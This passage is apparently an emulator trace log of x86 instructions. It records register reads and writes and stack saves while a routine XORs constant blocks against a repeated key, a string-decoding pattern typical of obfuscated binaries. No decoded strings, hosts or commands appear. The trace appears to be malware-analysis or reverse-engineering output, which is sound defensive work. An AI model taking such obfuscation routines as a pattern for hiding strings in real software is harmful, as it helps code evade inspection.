and offset 0x80f4 for stack size 0x10000 saving data to stack: 896082049 4 0x45e2d2: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e2d4: mov dword ptr [esp + 0xf8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7ac and offset 0x80f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e2db: mov dword ptr [esp + 0xfc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x7ac and offset 0x80fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45e2e6: pxor xmm1, xmmword ptr [esp + 0xf0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x7ac and offset 0x80f0 for stack size 0x10000 0x45e2ef: push eax, regs_read: [30, 19], regs_write: [30] 0x45e2f6: movaps xmmword ptr [esp + 0xf4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x7a8 and offset 0x80f4 for stack size 0x10000 saving data to stack: 0 16 0x45e30c: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45e311: mov dword ptr [esp + 0x220], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x7a8 and offset 0x8220 for stack size 0x10000 saving data to stack: 914789047 4 0x45e31c: mov dword ptr [esp + 0x22c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7a8 and offset 0x822c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e323: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e325: mov dword ptr [esp + 0x10c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x7a8 and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e333: mov dword ptr [esp + 0x224], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x7a8 and offset 0x8224 for stack size 0x10000 saving data to stack: 896093928 4 0x45e33e: mov dword ptr [esp + 0x228], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7a8 and offset 0x8228 for stack size 0x10000 saving data to stack: 929680980 4 0x45e345: movaps xmm1, xmmword ptr [esp + 0x220], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x7a8 and offset 0x8220 for stack size 0x10000 0x45e34d: mov dword ptr [esp + 0x100], 0x57ebfdd3, regs_read: [30], regs_write: () adjusting stack for ESP 0x7a8 and offset 0x8100 for stack size 0x10000 saving data to stack: 1475083731 4 0x45e358: mov dword ptr [esp + 0x104], 0x35692081, regs_read: [30], regs_write: () adjusting stack for ESP 0x7a8 and offset 0x8104 for stack size 0x10000 saving data to stack: 896082049 4 0x45e363: mov dword ptr [esp + 0x108], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x7a8 and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x45e36a: pxor xmm1, xmmword ptr [esp + 0x100], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x7a8 and offset 0x8100 for stack size 0x10000 0x45e373: push eax, regs_read: [30, 19], regs_write: [30] 0x45e374: movaps xmmword ptr [esp + 0x104], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x7a4 and offset 0x8104 for stack size 0x10000 saving data to stack: 121398885183332 16 0x45e388: push ecx, regs_read: [30, 22], regs_write: [30] 0x45e389: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45e390: push dword ptr [esp + 0x1ac], regs_read: [30], regs_write: [30] 0x45e39e: push dword ptr [esp + 0x1ac], regs_read: [30], regs_write: [30] 0x45e3aa: movaps xmm1, xmmword ptr [esp + 0x230], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x798 and offset 0x8230 for stack size 0x10000 0x45e3b9: mov dword ptr [esp + 0x110], 0x5ef2f3c7, regs_read: [30], regs_write: () adjusting stack for ESP 0x798 and offset 0x8110 for stack size 0x10000 saving data to stack: 1592980423 4 0x45e3c4: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e3c6: mov dword ptr [esp + 0x114], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x798 and offset 0x8114 for stack size 0x10000 saving data to stack: 896093928 4 0x45e3d1: mov dword ptr [esp + 0x118], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x798 and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x45e3d8: mov dword ptr [esp + 0x11c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x798 and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e3e3: pxor xmm1, xmmword ptr [esp + 0x110], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x798 and offset 0x8110 for stack size 0x10000 0x45e3ec: push eax, regs_read: [30, 19], regs_write: [30] 0x45e3ed: movaps xmmword ptr [esp + 0x114], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x794 and offset 0x8114 for stack size 0x10000 saving data to stack: 1752457584 16 0x45e403: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45e408: mov dword ptr [esp + 0x120], 0x5ef2f3c7, regs_read: [30], regs_write: () adjusting stack for ESP 0x794 and offset 0x8120 for stack size 0x10000 saving data to stack: 1592980423 4 0x45e413: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45e418: mov dword ptr [esp + 0x124], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x794 and offset 0x8124 for stack size 0x10000 saving data to stack: 896093928 4 0x45e41f: mov dword ptr [esp + 0x12c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x794 and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e426: mov dword ptr [esp + 0x128], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x794 and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x45e42d: movaps xmm1, xmmword ptr [esp + 0x120], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x794 and offset 0x8120 for stack size 0x10000 0x45e435: mov dword ptr [esp + 0x244], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x794 and offset 0x8244 for stack size 0x10000 saving data to stack: 896093928 4 0x45e43c: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e43e: mov dword ptr [esp + 0x24c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x794 and offset 0x824c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e44c: mov dword ptr [esp + 0x240], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x794 and offset 0x8240 for stack size 0x10000 saving data to stack: 914789047 4 0x45e457: mov dword ptr [esp + 0x248], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x794 and offset 0x8248 for stack size 0x10000 saving data to stack: 929680980 4 0x45e45e: pxor xmm1, xmmword ptr [esp + 0x240], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x794 and offset 0x8240 for stack size 0x10000 0x45e467: push eax, regs_read: [30, 19], regs_write: [30] 0x45e468: movaps xmmword ptr [esp + 0x124], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x790 and offset 0x8124 for stack size 0x10000 saving data to stack: 1752457584 16 0x45e47c: push ecx, regs_read: [30, 22], regs_write: [30] 0x45e47d: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45e484: push dword ptr [esp + 0x1b4], regs_read: [30], regs_write: [30] 0x45e492: push dword ptr [esp + 0x1b4], regs_read: [30], regs_write: [30] 0x45e49e: mov dword ptr [esp + 0x130], 0x5ff6ead2, regs_read: [30], regs_write: () adjusting stack for ESP 0x784 and offset 0x8130 for stack size 0x10000 saving data to stack: 1610017490 4 0x45e4b0: mov dword ptr [esp + 0x134], 0x5c1d2f9a, regs_read: [30], regs_write: () adjusting stack for ESP 0x784 and offset 0x8134 for stack size 0x10000 saving data to stack: 1545416602 4 0x45e4bb: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e4bd: mov dword ptr [esp + 0x138], 0x562da03b, regs_read: [30], regs_write: () adjusting stack for ESP 0x784 and offset 0x8138 for stack size 0x10000 saving data to stack: 1445830715 4 0x45e4c8: mov dword ptr [esp + 0x13c], 0x52ca85e1, regs_read: [30], regs_write: () adjusting stack for ESP 0x784 and offset 0x813c for stack size 0x10000 saving data to stack: 1389004257 4 0x45e4d3: movaps xmm0, xmmword ptr [esp + 0x130], regs_read: [30], regs_write: [122] adjusting stack for ESP 0x784 and offset 0x8130 for stack size 0x10000 0x45e4db: pxor xmm0, xmmword ptr [esp + 0x250], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP 0x784 and offset 0x8250 for stack size 0x10000 0x45e4e4: push eax, regs_read: [30, 19], regs_write: [30] 0x45e4e5: movaps xmmword ptr [esp + 0x134], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP 0x780 and offset 0x8134 for stack size 0x10000 saving data to stack: 2057743939594897280759431699658853 16 0x45e4fb: mov dword ptr [esp + 0x260], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x780 and offset 0x8260 for stack size 0x10000 saving data to stack: 914789047 4 0x45e50d: mov dword ptr [esp + 0x264], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x780 and offset 0x8264 for stack size 0x10000 saving data to stack: 896093928 4 0x45e518: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e51a: mov dword ptr [esp + 0x268], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x780 and offset 0x8268 for stack size 0x10000 saving data to stack: 929680980 4 0x45e521: mov dword ptr [esp + 0x26c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x780 and offset 0x826c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e52c: movaps xmm1, xmmword ptr [esp + 0x260], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x780 and offset 0x8260 for stack size 0x10000 0x45e534: mov dword ptr [esp + 0x140], 0x5ff6ead2, regs_read: [30], regs_write: () adjusting stack for ESP 0x780 and offset 0x8140 for stack size 0x10000 saving data to stack: 1610017490 4 0x45e53f: mov dword ptr [esp + 0x144], 0x5c1d2f9a, regs_read: [30], regs_write: () adjusting stack for ESP 0x780 and offset 0x8144 for stack size 0x10000 saving data to stack: 1545416602 4 0x45e54a: mov dword ptr [esp + 0x148], 0x562da03b, regs_read: [30], regs_write: () adjusting stack for ESP 0x780 and offset 0x8148 for stack size 0x10000 saving data to stack: 1445830715 4 0x45e555: mov dword ptr [esp + 0x14c], 0x52ca85e1, regs_read: [30], regs_write: () adjusting stack for ESP 0x780 and offset 0x814c for stack size 0x10000 saving data to stack: 1389004257 4 0x45e560: pxor xmm1, xmmword ptr [esp + 0x140], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x780 and offset 0x8140 for stack size 0x10000 0x45e569: push eax, regs_read: [30, 19], regs_write: [30] 0x45e56a: movaps xmmword ptr [esp + 0x144], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x77c and offset 0x8144 for stack size 0x10000 saving data to stack: 2057743939594897280759431699658853 16 0x45e57e: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45e585: mov edi, dword ptr [esp + 0x1b8], regs_read: [30], regs_write: [23] adjusting stack for ESP 0x77c and offset 0x81b8 for stack size 0x10000 0x45e58c: mov dword ptr [esp + 0x18], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x77c and offset 0x8018 for stack size 0x10000 saving data to stack: 0 4 0x45e590: mov edi, dword ptr [esp + 0x1bc], regs_read: [30], regs_write: [23] adjusting stack for ESP 0x77c and offset 0x81bc for stack size 0x10000 0x45e597: mov dword ptr [esp + 0x14], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x77c and offset 0x8014 for stack size 0x10000 saving data to stack: 0 4 0x45e59b: mov edi, 0x3769ce54, regs_read: (), regs_write: [23] 0x45e5a2: mov eax, dword ptr [esp + 0x2c], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x77c and offset 0x802c for stack size 0x10000 0x45e5a6: mov dword ptr [esp + 0x14], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x77c and offset 0x8014 for stack size 0x10000 saving data to stack: 0 4 0x45e5aa: mov eax, dword ptr [esp + 0x28], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x77c and offset 0x8028 for stack size 0x10000 0x45e5ae: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x77c and offset 0x8018 for stack size 0x10000 saving data to stack: 0 4 0x45e5b2: movaps xmm1, xmmword ptr [esp + 0x270], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x77c and offset 0x8270 for stack size 0x10000 0x45e5c1: mov dword ptr [esp + 0x150], 0x53ebf3d9, regs_read: [30], regs_write: () adjusting stack for ESP 0x77c and offset 0x8150 for stack size 0x10000 saving data to stack: 1407972313 4 0x45e5cc: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e5ce: mov dword ptr [esp + 0x154], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x77c and offset 0x8154 for stack size 0x10000 saving data to stack: 896093928 4 0x45e5d9: mov dword ptr [esp + 0x158], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x77c and offset 0x8158 for stack size 0x10000 saving data to stack: 929680980 4 0x45e5e0: mov dword ptr [esp + 0x15c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x77c and offset 0x815c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e5eb: pxor xmm1, xmmword ptr [esp + 0x150], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x77c and offset 0x8150 for stack size 0x10000 0x45e5f4: push eax, regs_read: [30, 19], regs_write: [30] 0x45e5f5: movaps xmmword ptr [esp + 0x154], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x778 and offset 0x8154 for stack size 0x10000 saving data to stack: 18944844 16 0x45e60b: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45e610: mov dword ptr [esp + 0x280], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x778 and offset 0x8280 for stack size 0x10000 saving data to stack: 914789047 4 0x45e61b: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45e620: mov dword ptr [esp + 0x284], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x778 and offset 0x8284 for stack size 0x10000 saving data to stack: 896093928 4 0x45e627: mov dword ptr [esp + 0x28c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x778 and offset 0x828c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e62e: mov dword ptr [esp + 0xbc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x778 and offset 0x80bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45e63c: mov dword ptr [esp + 0xb4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x778 and offset 0x80b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45e643: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e645: mov dword ptr [esp + 0x288], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x778 and offset 0x8288 for stack size 0x10000 saving data to stack: 929680980 4 0x45e64c: movaps xmm1, xmmword ptr [esp + 0x280], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x778 and offset 0x8280 for stack size 0x10000 0x45e654: mov dword ptr [esp + 0xb0], 0x53ebf3d9, regs_read: [30], regs_write: () adjusting stack for ESP 0x778 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1407972313 4 0x45e65f: mov dword ptr [esp + 0xb8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x778 and offset 0x80b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e666: pxor xmm1, xmmword ptr [esp + 0xb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x778 and offset 0x80b0 for stack size 0x10000 0x45e66f: push eax, regs_read: [30, 19], regs_write: [30] 0x45e670: movaps xmmword ptr [esp + 0xb4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x774 and offset 0x80b4 for stack size 0x10000 saving data to stack: 1701667182 16 0x45e684: push ecx, regs_read: [30, 22], regs_write: [30] 0x45e685: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45e68c: push dword ptr [esp + 0x1c4], regs_read: [30], regs_write: [30] 0x45e69a: push dword ptr [esp + 0x1c4], regs_read: [30], regs_write: [30] 0x45e6a6: mov dword ptr [esp + 0x160], 0x43eaf3c1, regs_read: [30], regs_write: () adjusting stack for ESP 0x768 and offset 0x8160 for stack size 0x10000 saving data to stack: 1139471297 4 0x45e6b8: mov dword ptr [esp + 0x164], 0x35694e8d, regs_read: [30], regs_write: () adjusting stack for ESP 0x768 and offset 0x8164 for stack size 0x10000 saving data to stack: 896093837 4 0x45e6c3: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e6c5: mov dword ptr [esp + 0x168], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x768 and offset 0x8168 for stack size 0x10000 saving data to stack: 929680980 4 0x45e6cc: mov dword ptr [esp + 0x16c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x768 and offset 0x816c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e6d7: movaps xmm0, xmmword ptr [esp + 0x160], regs_read: [30], regs_write: [122] adjusting stack for ESP 0x768 and offset 0x8160 for stack size 0x10000 0x45e6df: pxor xmm0, xmmword ptr [esp + 0x290], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP 0x768 and offset 0x8290 for stack size 0x10000 0x45e6e8: push eax, regs_read: [30, 19], regs_write: [30] 0x45e6e9: movaps xmmword ptr [esp + 0x164], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP 0x764 and offset 0x8164 for stack size 0x10000 saving data to stack: 435761734006 16 0x45e6ff: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45e704: mov dword ptr [esp + 0x170], 0x43eaf3c1, regs_read: [30], regs_write: () adjusting stack for ESP 0x764 and offset 0x8170 for stack size 0x10000 saving data to stack: 1139471297 4 0x45e70f: mov dword ptr [esp + 0x17c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x764 and offset 0x817c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e716: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e718: mov dword ptr [esp + 0x174], 0x35694e8d, regs_read: [30], regs_write: () adjusting stack for ESP 0x764 and offset 0x8174 for stack size 0x10000 saving data to stack: 896093837 4 0x45e723: mov dword ptr [esp + 0x178], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x764 and offset 0x8178 for stack size 0x10000 saving data to stack: 929680980 4 0x45e72a: movaps xmm1, xmmword ptr [esp + 0x170], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x764 and offset 0x8170 for stack size 0x10000 0x45e732: mov dword ptr [esp + 0x2ac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x764 and offset 0x82ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45e740: mov dword ptr [esp + 0x2a0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x764 and offset 0x82a0 for stack size 0x10000 saving data to stack: 914789047 4 0x45e74b: mov dword ptr [esp + 0x2a4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x764 and offset 0x82a4 for stack size 0x10000 saving data to stack: 896093928 4 0x45e756: mov dword ptr [esp + 0x2a8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x764 and offset 0x82a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e75d: pxor xmm1, xmmword ptr [esp + 0x2a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x764 and offset 0x82a0 for stack size 0x10000 0x45e766: push eax, regs_read: [30, 19], regs_write: [30] 0x45e767: movaps xmmword ptr [esp + 0x174], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x760 and offset 0x8174 for stack size 0x10000 saving data to stack: 435761734006 16 0x45e77b: push ecx, regs_read: [30, 22], regs_write: [30] 0x45e77c: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45e783: push dword ptr [esp + 0x1cc], regs_read: [30], regs_write: [30] 0x45e791: push dword ptr [esp + 0x1cc], regs_read: [30], regs_write: [30] 0x45e79d: mov dword ptr [esp + 0x180], 0x43e5f7c4, regs_read: [30], regs_write: () adjusting stack for ESP 0x754 and offset 0x8180 for stack size 0x10000 saving data to stack: 1139144644 4 0x45e7af: mov dword ptr [esp + 0x184], 0x35692b9a, regs_read: [30], regs_write: () adjusting stack for ESP 0x754 and offset 0x8184 for stack size 0x10000 saving data to stack: 896084890 4 0x45e7ba: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e7bc: mov dword ptr [esp + 0x188], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x754 and offset 0x8188 for stack size 0x10000 saving data to stack: 929680980 4 0x45e7c3: mov dword ptr [esp + 0x18c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x754 and offset 0x818c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e7ce: movaps xmm0, xmmword ptr [esp + 0x180], regs_read: [30], regs_write: [122] adjusting stack for ESP 0x754 and offset 0x8180 for stack size 0x10000 0x45e7d6: pxor xmm0, xmmword ptr [esp + 0x2b0], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP 0x754 and offset 0x82b0 for stack size 0x10000 0x45e7df: push eax, regs_read: [30, 19], regs_write: [30] 0x45e7e0: movaps xmmword ptr [esp + 0x184], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP 0x750 and offset 0x8184 for stack size 0x10000 saving data to stack: 111542270125427 16 0x45e7fa: mov ecx, 0x52cae095, regs_read: (), regs_write: [22] 0x45e801: mov dword ptr [esp + 0x198], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x750 and offset 0x8198 for stack size 0x10000 saving data to stack: 929680980 4 0x45e808: mov dword ptr [esp + 0x190], 0x73d3c0e3, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x8190 for stack size 0x10000 saving data to stack: 1943257315 4 0x45e813: mov dword ptr [esp + 0x194], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x8194 for stack size 0x10000 saving data to stack: 896093928 4 0x45e81e: mov dword ptr [esp + 0x19c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x750 and offset 0x819c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e825: movaps xmm1, xmmword ptr [esp + 0x190], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x750 and offset 0x8190 for stack size 0x10000 0x45e82d: mov dword ptr [esp + 0x2c8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x750 and offset 0x82c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e83b: mov dword ptr [esp + 0x2c0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x82c0 for stack size 0x10000 saving data to stack: 914789047 4 0x45e846: mov dword ptr [esp + 0x2c4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x82c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45e851: mov dword ptr [esp + 0x2cc], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x750 and offset 0x82cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45e858: pxor xmm1, xmmword ptr [esp + 0x2c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x750 and offset 0x82c0 for stack size 0x10000 0x45e861: mov dword ptr [esp + 0x28], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x750 and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x45e865: mov edi, 0x3769ce54, regs_read: (), regs_write: [23] 0x45e86a: movaps xmmword ptr [esp + 0x190], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x750 and offset 0x8190 for stack size 0x10000 saving data to stack: 1163219540 16 0x45e874: mov dword ptr [esp + 0x70], 0x65cad3f1, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x8070 for stack size 0x10000 saving data to stack: 1707791345 4 0x45e880: mov dword ptr [esp + 0x74], 0x35694ead, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x8074 for stack size 0x10000 saving data to stack: 896093869 4 0x45e888: mov dword ptr [esp + 0x78], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x750 and offset 0x8078 for stack size 0x10000 saving data to stack: 929680980 4 0x45e88c: mov dword ptr [esp + 0x7c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x750 and offset 0x807c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e890: movaps xmm1, xmmword ptr [esp + 0x70], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x750 and offset 0x8070 for stack size 0x10000 0x45e895: mov dword ptr [esp + 0x2d0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x82d0 for stack size 0x10000 saving data to stack: 914789047 4 0x45e8a0: mov dword ptr [esp + 0x2d4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x82d4 for stack size 0x10000 saving data to stack: 896093928 4 0x45e8ab: mov dword ptr [esp + 0x2d8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x750 and offset 0x82d8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e8b2: mov dword ptr [esp + 0x2dc], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x750 and offset 0x82dc for stack size 0x10000 saving data to stack: 1389027477 4 0x45e8b9: pxor xmm1, xmmword ptr [esp + 0x2d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x750 and offset 0x82d0 for stack size 0x10000 0x45e8c2: movaps xmmword ptr [esp + 0x70], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x750 and offset 0x8070 for stack size 0x10000 saving data to stack: 297750249798 16 0x45e8c7: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x750 and offset 0x8028 for stack size 0x10000 saving data to stack: 1389027477 4 0x45e8cb: mov dword ptr [esp + 0x8c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x750 and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e8d9: mov dword ptr [esp + 0x80], 0x46f2e6df, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x8080 for stack size 0x10000 saving data to stack: 1190323935 4 0x45e8e4: mov dword ptr [esp + 0x84], 0x4c0520a7, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x8084 for stack size 0x10000 saving data to stack: 1275404455 4 0x45e8ef: mov dword ptr [esp + 0x88], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x750 and offset 0x8088 for stack size 0x10000 saving data to stack: 929680980 4 0x45e8f6: movaps xmm1, xmmword ptr [esp + 0x80], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x750 and offset 0x8080 for stack size 0x10000 0x45e8fe: mov dword ptr [esp + 0x2ec], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x750 and offset 0x82ec for stack size 0x10000 saving data to stack: 1389027477 4 0x45e905: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45e907: mov dword ptr [esp + 0x2e0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x82e0 for stack size 0x10000 saving data to stack: 914789047 4 0x45e912: mov dword ptr [esp + 0x2e4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x750 and offset 0x82e4 for stack size 0x10000 saving data to stack: 896093928 4 0x45e91d: mov dword ptr [esp + 0x2e8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x750 and offset 0x82e8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e924: pxor xmm1, xmmword ptr [esp + 0x2e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x750 and offset 0x82e0 for stack size 0x10000 0x45e92d: push eax, regs_read: [30, 19], regs_write: [30] 0x45e92e: movaps xmmword ptr [esp + 0x84], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x74c and offset 0x8084 for stack size 0x10000 saving data to stack: 8749489463542183016 16 0x45e948: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45e94f: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45e954: mov dword ptr [esp + 0x98], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x74c and offset 0x8098 for stack size 0x10000 saving data to stack: 929680980 4 0x45e95b: mov dword ptr [esp + 0x90], 0x73d3c0e3, regs_read: [30], regs_write: () adjusting stack for ESP 0x74c and offset 0x8090 for stack size 0x10000 saving data to stack: 1943257315 4 0x45e966: mov dword ptr [esp + 0x94], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x74c and offset 0x8094 for stack size 0x10000 saving data to stack: 896093928 4 0x45e96d: mov dword ptr [esp + 0x9c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x74c and offset 0x809c for stack size 0x10000 saving data to stack: 1389027477 4 0x45e974: movaps xmm1, xmmword ptr [esp + 0x90], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x74c and offset 0x8090 for stack size 0x10000 0x45e97c: mov dword ptr [esp + 0x2f8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x74c and offset 0x82f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e98a: mov dword ptr [esp + 0x2f0], 0x368692b7, regs_read: [30], 